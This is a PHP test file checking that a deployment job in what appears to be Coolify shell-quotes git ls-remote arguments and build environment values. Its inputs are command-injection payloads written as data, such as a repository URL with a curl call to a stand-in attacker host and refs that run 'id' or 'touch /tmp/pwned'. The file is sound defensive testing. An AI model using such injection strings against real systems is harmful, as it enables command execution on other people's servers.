<?php

use App\Jobs\ApplicationDeploymentJob;

function setDeploymentJobProperty(ApplicationDeploymentJob $job, string $property, mixed $value): void
{
    $reflection = new ReflectionClass($job);
    $propertyReflection = $reflection->getProperty($property);
    $propertyReflection->setValue($job, $value);
}

function newUninitializedDeploymentJob(): ApplicationDeploymentJob
{
    return (new ReflectionClass(ApplicationDeploymentJob::class))->newInstanceWithoutConstructor();
}

it('quotes git ls-remote repository and ref arguments', function () {
    $job = newUninitializedDeploymentJob();
    $repo = 'https://github.com/acme/repo.git;curl https://attacker.test/pwn';
    $ref = 'refs/heads/main;touch /tmp/pwned';

    setDeploymentJobProperty($job, 'customPort', 2222);
    setDeploymentJobProperty($job, 'fullRepoUrl', $repo);

    $method = new ReflectionMethod($job, 'gitLsRemoteCommand');

    expect($method->invoke($job, $ref))->toBe(
        'GIT_SSH_COMMAND="ssh -o ConnectTimeout=30 -p 2222 -o Port=2222 -o LogLevel=ERROR -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null" git ls-remote '.escapeshellarg($repo).' '.escapeshellarg($ref)
    );
});

it('keeps private key git ls-remote arguments quoted', function () {
    $job = newUninitializedDeploymentJob();
    $repo = "git@example.com:acme/repo.git';id;#";
    $ref = "refs/heads/main';id;#";

    setDeploymentJobProperty($job, 'customPort', 22);
    setDeploymentJobProperty($job, 'fullRepoUrl', $repo);

    $method = new ReflectionMethod($job, 'gitLsRemoteCommand');

    expect($method->invoke($job, $ref, true))->toBe(
        'GIT_SSH_COMMAND="ssh -o ConnectTimeout=30 -p 22 -o Port=22 -o LogLevel=ERROR -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i /root/.ssh/id_rsa" git ls-remote '.escapeshellarg($repo).' '.escapeshellarg($ref)
    );
});

it('quotes Coolify build environment values', function () {
    $job = newUninitializedDeploymentJob();
    $value = "main'; id >/tmp/pwned; #";

    $method = new ReflectionMethod($job, 'shellEnvironmentAssignment');

    expect($method->invoke($job, 'COOLIFY_BRANCH', $value))
        ->toBe('COOLIFY_BRANCH='.escapeshellarg($value).' ');
});
